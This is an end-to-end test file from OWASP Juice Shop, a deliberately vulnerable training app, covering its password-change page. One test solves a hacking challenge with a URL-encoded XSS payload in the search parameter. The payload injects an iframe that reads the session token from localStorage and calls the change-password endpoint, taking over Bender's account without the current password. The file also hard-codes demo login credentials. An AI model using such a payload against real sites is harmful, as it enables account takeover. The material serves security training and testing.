/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')

describe('/#/privacy-security/change-password', () => {
  let currentPassword, newPassword, newPasswordRepeat, changeButton

  describe('as Morty', () => {
    protractor.beforeEach.login({ email: `morty@${config.get('application.domain')}`, password: 'focusOnScienceMorty!focusOnScience' })

    beforeEach(() => {
      browser.get(`${protractor.basePath}/#/privacy-security/change-password`)
      currentPassword = element(by.id('currentPassword'))
      newPassword = element(by.id('newPassword'))
      newPasswordRepeat = element(by.id('newPasswordRepeat'))
      changeButton = element(by.id('changeButton'))
    })

    it('should be able to change password', () => {
      currentPassword.sendKeys('focusOnScienceMorty!focusOnScience')
      newPassword.sendKeys('GonorrheaCantSeeUs!')
      newPasswordRepeat.sendKeys('GonorrheaCantSeeUs!')
      changeButton.click()

      expect($('.confirmation').getAttribute('hidden')).not.toBeTruthy()
    })
  })

  describe('challenge "changePasswordBenderChallenge"', () => {
    protractor.beforeEach.login({ email: `bender@${config.get('application.domain')}`, password: 'OhG0dPlease1nsertLiquor!' })

    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
      browser.get(`${protractor.basePath}/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E`)
      browser.driver.sleep(2000)
      browser.get(`${protractor.basePath}/#/login`)
      element(by.id('email')).sendKeys(`bender@${config.get('application.domain')}`)
      element(by.id('password')).sendKeys('slurmCl4ssic')
      element(by.id('loginButton')).click()

      expect(browser.getCurrentUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({ challenge: 'Change Bender\'s Password' })
  })
})
